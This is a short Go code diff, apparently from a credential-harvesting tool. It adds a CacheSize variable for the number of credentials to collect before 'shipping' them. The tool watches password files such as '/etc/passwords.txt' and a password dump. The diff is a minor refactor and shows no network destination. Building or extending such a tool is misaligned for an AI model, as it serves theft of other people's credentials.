@@ -9,6 +9,9 @@ import (
 	"time"
 )
 
+//CacheSize is the minimum number of cached credentials to gather before shipping.
+var CacheSize = 1
+
 // watch passes the files/cache into the file_watch functions
 func watch(files []string, c *cred_cache.CredCache) {
 	checkFiles(files, c)
@@ -32,7 +35,7 @@ func getIP() string {
 // Define files to track, initiate the cache, watch/ship it
 func main() {
 	files := []string{"/etc/passwords.txt:def", "/path/to/password.dump:parse_type"} // []string of files to watch
-	min := 1
+	min := CacheSize
 	ip := getIP()
 
 	ca := cred_cache.CredCache{
